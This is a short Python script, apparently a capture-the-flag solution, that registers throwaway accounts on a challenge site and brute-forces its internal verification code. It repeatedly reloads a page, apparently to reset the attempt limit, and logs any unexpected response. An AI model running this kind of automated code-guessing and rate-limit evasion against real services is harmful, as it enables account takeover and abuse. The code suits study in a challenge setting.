import logging
import random
from dataclasses import dataclass

import requests

singup_url = "https://task4.jbctf.com/signup"
verify_url = "https://task4.jbctf.com/internal_verify_code"
internal_url = "https://task4.jbctf.com/internal"

acc_name = "i_am_a_dog_"

def_headers = {
    "authority": "task4.jbctf.com",
    "accept": "application/json, text/javascript, */*; q=0.01",
    "accept-language": "ru-RU,ru;q=0.9",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "origin": "https://task4.jbctf.com",
    "referer": "https://task4.jbctf.com/internal",
}


def generateCode(code: int):
    return f"code=10{pad_number(code)}"


def pad_number(num):
    return str(num).zfill(2)


@dataclass
class BruteForce:
    logger = None

    def __init__(self, log_name: str):
        self.log_name = log_name

        self.logger = logging.getLogger(log_name)
        self.logger.setLevel(logging.INFO)

        file_handler = logging.FileHandler(log_name)
        file_handler.setLevel(logging.INFO)
        file_handler.setFormatter(
            logging.Formatter(
                "[%(asctime)s] [%(levelname)s] --- %(message)s (%(filename)s:%(lineno)s)",
                datefmt="%H:%M:%S"
            )
        )

        self.logger.addHandler(file_handler)

    def create_acc(self) -> str:
        user = f"{acc_name}{random.randint(1, 1_000_000)}"
        response = requests.request("POST", singup_url, headers=def_headers, data={"username": user, "password": user})

        cookie = response.headers["set-cookie"]
        self.logger.info(f"Created account for `{user}`. Cookie is `{cookie}`")
        return cookie

    def main(self):
        cookie = self.create_acc()
        headers = {**def_headers, "cookie": cookie}

        iterations = 0

        for iter in range(1_000_000_000_000):
            requests.request("GET", internal_url, headers=headers)

            for i in range(10):
                response = requests.request("POST", verify_url, headers=headers, data={'code': generateCode(i)})
                if (not response.text.startswith("{\"mssg\":\"Incorrect code")
                        and not response.text.startswith("{\"mssg\":\"Run out of attempts")):
                    self.logger.info(f"{i}: {response.text} : {generateCode(i)}")
                    input("Found interesting response!")
                    input("Press Enter to continue...")
                iterations += 1

            self.logger.info(f"Done {iterations} iterations")
